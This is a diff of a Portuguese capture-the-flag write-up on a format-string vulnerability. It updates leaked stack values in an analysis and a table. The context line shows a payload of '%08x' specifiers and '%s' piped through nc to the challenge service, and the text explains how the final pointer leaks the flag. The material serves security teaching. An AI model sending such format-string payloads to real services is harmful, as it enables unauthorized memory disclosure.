@@ -63,8 +63,8 @@ echo -e '%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%s' | nc suspicious-string
 
 **Análise:**
 
-- Os primeiros valores (`ae78a4d1`, `fbad2088`, etc.) são dados que continuam sendo lidos da pilha.
-- O valor mais importante é o último: `ae7892a0`. Esse valor representa um **ponteiro** que aponta para uma string armazenada na memória.
+- Os primeiros valores (`9e63e4d1`, `fbad2088`, etc.) são dados que continuam sendo lidos da pilha.
+- O valor mais importante é o último: `9e63d2a0`. Esse valor representa um **ponteiro** que aponta para uma string armazenada na memória.
 - O especificador `%s` utilizou esse ponteiro para acessar e exibir o conteúdo da memória. A string recuperada foi a **flag**: `flag{f0rm4t_str1ng_1s_4w3s0m3}`.
 
 ---
@@ -75,15 +75,15 @@ echo -e '%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%s' | nc suspicious-string
 
 | Posição na pilha | Valor Lido       | Interpretação                        |
 |------------------|------------------|--------------------------------------|
-| [Posição 0]      | ae78a4d1         | Endereço ou valor temporário na pilha         |
+| [Posição 0]      | 9e63e4d1         | Endereço ou valor temporário na pilha         |
 | [Posição 1]      | fbad2088         | Possivelmente parte de uma estrutura de controle de I/O (como `FILE`) |
-| [Posição 2]      | 51875b2f         | Outro valor temporário ou ponteiro |
-| [Posição 3]      | ae78a500         | Valor armazenado na pilha, provavelmente um ponteiro ou variável local |
+| [Posição 2]      | 619c1b2f         | Outro valor temporário ou ponteiro |
+| [Posição 3]      | 9e63e500         | Valor armazenado na pilha, provavelmente um ponteiro ou variável local |
 | [Posição 4]      | 00000000         | Valor nulo, frequentemente usado como delimitador ou ponteiro nulo |
-| [Posição 5]      | 35ebe238         | Outro endereço temporário armazenado na pilha |
+| [Posição 5]      | d30f8d68         | Outro endereço temporário armazenado na pilha |
 | [Posição 6]      | 00c00000         | Possivelmente um valor relacionado à alocação de memória |
 | [Posição 7]      | 00010000         | Valor constante utilizado pelo programa |
-| [Posição 8]      | ae7892a0         | **Ponteiro para a string da flag** armazenada na memória |
+| [Posição 8]      | 9e63d2a0         | **Ponteiro para a string da flag** armazenada na memória |
 | [Posição 9]      | flag{f0rm4t_str1ng_1s_4w3s0m3} | **Flag recuperada utilizando %s** |
 
 ### **Resumo**:
